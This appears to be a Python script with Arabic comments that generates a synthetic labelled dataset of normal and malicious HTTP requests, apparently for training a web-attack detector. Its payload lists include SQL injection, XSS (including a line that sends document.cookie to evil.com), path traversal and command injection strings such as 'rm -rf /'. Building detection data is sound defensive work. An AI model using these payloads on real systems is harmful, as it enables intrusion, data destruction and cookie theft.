import pandas as pd
import random
import string

# URIs طبيعية من مواقع مختلفة
# أضف هذه الـ URIs للبيانات الطبيعية
normal_uris = [
    "/index.html", "/index.php", "/home.php",
    "/login.php", "/logout.php", "/register.php",
    "/dashboard.php", "/profile.php", "/settings.php",
    "/products.php", "/cart.php", "/checkout.php",
    "/about.php", "/contact.php", "/search.php",
    "/robots.txt", "/sitemap.xml", "/favicon.ico",
    "/static/css/main.css", "/static/js/app.js",
    "/api/users", "/api/products", "/api/orders",
    "/admin/panel.php", "/admin/users.php",
    "/blog/post.php", "/news/article.php",
    "/shop/item", "/shop/cart", "/shop/checkout",
    "/user/profile", "/user/settings",
    "/api/v1/auth/token", "/api/v2/data",
    "/assets/logo.png", "/assets/style.css",
]

normal_get = [
    "page=1&limit=10", "id=1&lang=en",
    "q=hello+world", "category=tech&sort=date",
    "user=john&role=admin", "token=abc123",
    "offset=0&count=20", "filter=active",
    "id=5", "id=1", "id=2&name=product",
    "username=john&remember=1",
    "page=about", "lang=ar", "theme=dark",
    "", "", "", "", "", "",
]

normal_post = [
    "username=john&password=pass123",
    "username=admin&password=adminpass",
    "email=test@example.com&name=John",
    "title=Hello&body=World",
    "product_id=5&qty=2",
    "comment=Nice+post&post_id=3",
    "login=john&pass=secret123",
    "user=ayad&pwd=mypass",
    "", "", "",
]

# هجمات SQL Injection
sql_payloads = [
    "' OR 1=1--", "' OR '1'='1",
    "1 UNION SELECT username,password FROM users--",
    "1; DROP TABLE users--",
    "' AND 1=2 UNION SELECT null,table_name FROM information_schema.tables--",
    "admin'--", "1' ORDER BY 3--",
    "' EXEC xp_cmdshell('dir')--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' OR 1=1 LIMIT 1--",
    "1 UNION ALL SELECT NULL,NULL,NULL--",
    "'; INSERT INTO users VALUES('hacker','hacked')--",
]

# هجمات XSS
xss_payloads = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg onload=alert(1)>",
    "'\"><script>fetch('http://evil.com?c='+document.cookie)</script>",
    "<body onload=alert('xss')>",
    "<iframe src=javascript:alert('xss')>",
]

# هجمات Path Traversal
traversal_payloads = [
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\cmd.exe",
    "....//....//etc/shadow",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/var/www/../../etc/passwd",
]

# هجمات Command Injection
cmd_payloads = [
    "; ls -la", "| cat /etc/passwd",
    "& whoami", "`id`",
    "; rm -rf /", "|| ping -c 1 evil.com",
]

rows = []

# توليد بيانات طبيعية
for _ in range(30000):
    uri      = random.choice(normal_uris)
    get_q    = random.choice(normal_get)
    post_d   = random.choice(normal_post) if random.random() > 0.5 else ""
    method   = "POST" if post_d else "GET"
    rows.append({
        "uri": uri, "get_query": get_q,
        "post_data": post_d, "method": method,
        "label": "Valid"
    })

# توليد هجمات SQL
for payload in sql_payloads * 80:
    inject_in = random.choice(["uri", "get", "post"])
    uri    = random.choice(normal_uris)
    get_q  = ""
    post_d = ""
    if inject_in == "uri":
        uri = uri + "?id=" + payload
    elif inject_in == "get":
        get_q = "id=" + payload + "&page=1"
    else:
        post_d = "username=" + payload + "&password=test"
    method = "POST" if post_d else "GET"
    rows.append({
        "uri": uri, "get_query": get_q,
        "post_data": post_d, "method": method,
        "label": "Anomalous"
    })

# توليد هجمات XSS
for payload in xss_payloads * 80:
    inject_in = random.choice(["uri", "get", "post"])
    uri    = random.choice(normal_uris)
    get_q  = ""
    post_d = ""
    if inject_in == "uri":
        uri = uri + "?q=" + payload
    elif inject_in == "get":
        get_q = "search=" + payload
    else:
        post_d = "comment=" + payload
    method = "POST" if post_d else "GET"
    rows.append({
        "uri": uri, "get_query": get_q,
        "post_data": post_d, "method": method,
        "label": "Anomalous"
    })

# توليد هجمات Traversal
for payload in traversal_payloads * 80:
    uri = "/files/" + payload
    rows.append({
        "uri": uri, "get_query": "",
        "post_data": "", "method": "GET",
        "label": "Anomalous"
    })

# توليد هجمات Command Injection
for payload in cmd_payloads * 80:
    get_q = "cmd=" + payload
    rows.append({
        "uri": random.choice(normal_uris), "get_query": get_q,
        "post_data": "", "method": "GET",
        "label": "Anomalous"
    })

df_new = pd.DataFrame(rows)
df_new.to_csv("data/synthetic_attacks.csv", index=False)
print(f"تم توليد {len(df_new)} صف")
print(df_new["label"].value_counts())
